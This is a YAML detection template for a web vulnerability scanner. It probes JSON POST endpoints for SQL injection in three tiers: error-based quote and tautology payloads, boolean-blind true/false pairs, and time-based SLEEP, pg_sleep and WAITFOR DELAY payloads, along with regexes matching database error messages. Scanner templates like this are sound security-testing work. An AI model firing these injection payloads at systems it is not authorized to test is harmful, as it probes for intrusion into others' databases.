id: generic-sqli-post-json
info:
  name: SQL Injection (POST/JSON) - Multi-Tier Detection
  description: SQL injection in JSON POST requests with multi-tier detection
  tags:
    - sqli
    - injection
    - json
    - generic
    - blind

generic:
  endpoint: "{{sqli_post}}"
  method: POST
  content_type: "application/json"
  body_template: '{"id": "{{payload}}"}'

  # Multi-tier detection for JSON POST SQLi
  detection_tiers:
    # Tier 1: PASSIVE - Error-based detection (fast, safe)
    - tier: passive
      detection_type: error_based
      payloads:
        - "'"
        - "\""
        - "')"
        - "\")"
        - "1' OR '1'='1"
        - "1\" OR \"1\"=\"1"

      matchers:
        - type: regex
          condition: or
          regex:
            - "SQL syntax.*?near"
            - "mysql_fetch.*?error"
            - "Warning.*?mysql_"
            - "ORA-\\d{5}"
            - "PostgreSQL.*?ERROR"
            - "SQLSTATE\\["
            - "SQLITE_ERROR"
            - "sqlite3\\.OperationalError"
            - "incomplete input"
            - "syntax error"
            - "unexpected token"
            - "Unclosed quotation mark"
            - "Incorrect syntax near"
          negative: false

    # Tier 2: ACTIVE - Boolean-blind for JSON
    - tier: active
      detection_type: boolean_blind
      baseline_payload: "valid_id"
      true_payload: "1' AND '1'='1"
      false_payload: "1' AND '1'='2"

      matchers:
        - type: regex
          condition: or
          regex:
            - "SQL syntax"
            - "ORA-"
          negative: true

    # Tier 3: AGGRESSIVE - Time-based for JSON (causes delays)
    - tier: aggressive
      detection_type: time_blind
      threshold_ms: 3000
      payloads:
        - "1' AND SLEEP(3)--"
        - "1' AND pg_sleep(3)--"
        - "1; SELECT SLEEP(3)--"
        - "1' WAITFOR DELAY '00:00:03'--"

      matchers:
        - type: regex
          condition: or
          regex:
            - "SQL syntax"
            - "ORA-"
          negative: true
